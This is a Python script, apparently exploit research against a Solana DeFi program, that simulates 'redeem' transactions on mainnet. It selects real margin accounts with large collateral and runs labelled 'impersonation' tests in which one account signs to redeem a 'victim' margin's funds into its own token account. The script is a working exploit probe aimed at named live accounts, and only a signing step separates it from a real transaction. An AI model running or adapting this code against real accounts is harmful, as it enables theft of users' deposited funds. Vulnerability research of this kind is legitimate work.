#!/usr/bin/env python3
"""Find margins with existing ATAs; run impersonation matrix; determine redeem amount unit."""
import json, urllib.request, time, base64, hashlib
from solders.transaction import Transaction
from solders.message import Message
from solders.pubkey import Pubkey
from solders.instruction import Instruction, AccountMeta
from solders.hash import Hash

RPC = "https://api.mainnet-beta.solana.com"
def rpc(method, params, retries=5, timeout=120):
    body = json.dumps({"jsonrpc":"2.0","id":1,"method":method,"params":params}).encode()
    last=None
    for i in range(retries):
        try:
            req = urllib.request.Request(RPC, data=body, headers={"Content-Type":"application/json","User-Agent":"research/1.0"})
            with urllib.request.urlopen(req, timeout=timeout) as r:
                out = json.loads(r.read())
            if "error" in out: raise RuntimeError(out["error"])
            return out
        except Exception as e:
            last=e; time.sleep(1.2*(i+1))
    raise RuntimeError(str(last))

ZO = Pubkey.from_string("Zo1ggzTUKMY5bYnDvT5mtVeZxzf2FaLTbKkmvGUhUQk")
TOKEN = Pubkey.from_string("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
STATE = Pubkey.from_string("71yykwxq1zQqy99PgRsgZJXi2HHK2UDx9G4va7pH6qRv")
VAULT = Pubkey.from_string("HjHSNe8hhvZ8hKCRrhKg1DGiGPd9NYQbUjT1SQRDo4kZ")
A2 = Pubkey.from_string("6kSuaA8Fi16ks53ye8eqgr7jZn2uus59W7gMSasgtFon")
A8 = Pubkey.from_string("Dwi4TnaYJTMUkVaHQgfKq6QzuWsyFSJwMxzkTemTLrvt")
VAULT_ATA = Pubkey.from_string("3er2PEWxhpuRkbVwE3ks2nynr5EtcSjCs5fdDJiKQocp")
USDC = Pubkey.from_string("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v")
REDEEM_DATA = bytes.fromhex("658ef6b8c6385cae")

def redeem_ix(signer, margin, control, dest):
    metas = [
        AccountMeta(STATE, True, False),
        AccountMeta(VAULT, False, False),
        AccountMeta(A2, True, False),
        AccountMeta(signer, True, True),
        AccountMeta(margin, True, False),
        AccountMeta(control, True, False),
        AccountMeta(dest, True, False),
        AccountMeta(VAULT_ATA, True, False),
        AccountMeta(A8, False, False),
        AccountMeta(TOKEN, False, False),
    ]
    return Instruction(ZO, REDEEM_DATA, metas)

def sim(ixs, payer, label):
    msg = Message.new_with_blockhash(ixs, payer, Hash.default())
    tx = Transaction.new_unsigned(msg)
    b64 = base64.b64encode(bytes(tx)).decode()
    r = rpc("simulateTransaction",[b64,{"encoding":"base64","sigVerify":False,"replaceRecentBlockhash":True,"commitment":"processed"}])
    v=r["result"]["value"]
    logs=v.get("logs") or []
    amt=None
    for l in logs:
        if "Program data:" in l:
            raw=base64.b64decode(l.split("Program data: ")[1].strip())
            if raw.hex().startswith("437a2f4a0f060e20") and len(raw)==80:
                amt=int.from_bytes(raw[-8:],"little")
    print(f"\n### {label}\n  err: {json.dumps(v.get('err'))}\n  RedeemUsdcLog amount: {amt}")
    for l in logs:
        if "AnchorError" in l or "Instruction:" in l or "failed" in l.lower() or "Result" in l:
            print("   log:", l[:190])
    return {"label":label,"err":v.get("err"),"amount":amt,"logs":logs}

# --- find margins whose authority has a USDC ATA (and non-zero collateral) ---
rows=json.load(open("analysis/all_margins.json"))
def score(r):
    return max([abs(x) for x in r['collateral']], default=0)
cand=sorted(rows, key=score, reverse=True)[:120]
picks=[]
for r in cand:
    if score(r)<1e5: break
    try:
        res=rpc("getTokenAccountsByOwner",[r["authority"],{"mint":str(USDC)},{"encoding":"jsonParsed"}])["result"]["value"]
        if res:
            picks.append((r, res[0]["pubkey"]))
    except Exception as e:
        pass
    if len(picks)>=6: break
    time.sleep(0.05)
print("margins with existing ATA:", [(p[0]["margin"], round(score(p[0]),3), p[1]) for p in picks])

results=[]
for r,ata_pk in picks[:4]:
    signer=Pubkey.from_string(r["authority"]); margin=Pubkey.from_string(r["margin"])
    ctrl_raw=rpc("getAccountInfo",[r["margin"],{"encoding":"base64"}])["result"]["value"]
    raw=base64.b64decode(ctrl_raw["data"][0]); ctrl=Pubkey.from_bytes(raw[441:473])
    nz=[(i,round(x,4)) for i,x in enumerate(r['collateral']) if abs(x)>1e-6]
    results.append(sim([redeem_ix(signer, margin, ctrl, Pubkey.from_string(ata_pk))], signer,
                       f"OWN-REDEEM margin={r['margin'][:12]} coll={nz} (unit test)"))

# --- impersonation tests on 99000-margin (authority has no ATA; use signer's own ATA) ---
M = Pubkey.from_string("12Vgds9vkUgW9QjeMCtnx71HzVfDmwj48bjpcE3RW8AN")
CTRL = Pubkey.from_string("9ZbzDp1L6dDAxPYdD2ub3qjZ7piKjiPUgYja8tvNb4dc")
S531 = Pubkey.from_string("531euoNtZMvciBcKPBvYgFJoWnUvtu4PjasDhbTTXTGG")
S531_ATA = Pubkey.from_string("3RKQCBVZ55CKZJTVG7qyo25EhyEQUGQL4LGQXKFuXb1g")
S531_MARGIN = Pubkey.from_string("5UjdurrpbP3i2hkw3Q2twfcz1X7VPpQWtruNwuxRvGX8")
S531_CTRL = Pubkey.from_string("4np53fZWjiHrJqddLssaA2mzA13ryc5GFZFmn1UBsQNV")

results.append(sim([redeem_ix(S531, M, CTRL, S531_ATA)], S531,
                   "IMPERSONATION A: signer=531euoNt, margin=victim(99000), control=victim, dest=signer ATA"))
results.append(sim([redeem_ix(S531, M, S531_CTRL, S531_ATA)], S531,
                   "IMPERSONATION B: signer=531euoNt, margin=victim(99000), control=signer's own, dest=signer ATA"))
results.append(sim([redeem_ix(S531, S531_MARGIN, S531_CTRL, S531_ATA)], S531,
                   "CONTROL: signer=531euoNt own margin/control/dest (expect amount=0)"))

json.dump(results, open("analysis/sim_redeem3.json","w"), indent=1, default=str)
print("\nDONE")
